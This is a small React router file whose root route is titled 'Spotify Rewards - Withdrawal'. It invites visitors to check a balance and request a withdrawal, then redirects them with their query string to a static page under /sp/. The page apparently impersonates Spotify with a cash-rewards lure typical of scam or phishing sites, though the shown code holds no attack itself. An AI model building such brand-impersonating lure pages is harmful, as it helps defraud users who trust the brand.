import { createFileRoute, redirect } from "@tanstack/react-router";
import { getRequestInfo } from "@/lib/request-info";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "Spotify Rewards - Withdrawal" },
      {
        name: "description",
        content: "Check your Spotify Rewards balance and request your withdrawal.",
      },
      { property: "og:title", content: "Spotify Rewards - Withdrawal" },
      {
        property: "og:description",
        content: "Check your Spotify Rewards balance and request your withdrawal.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  loader: () => {
    const { search } = getRequestInfo();
    throw redirect({ href: `/sp/index.html${search || ""}` });
  },
  component: () => null,
});
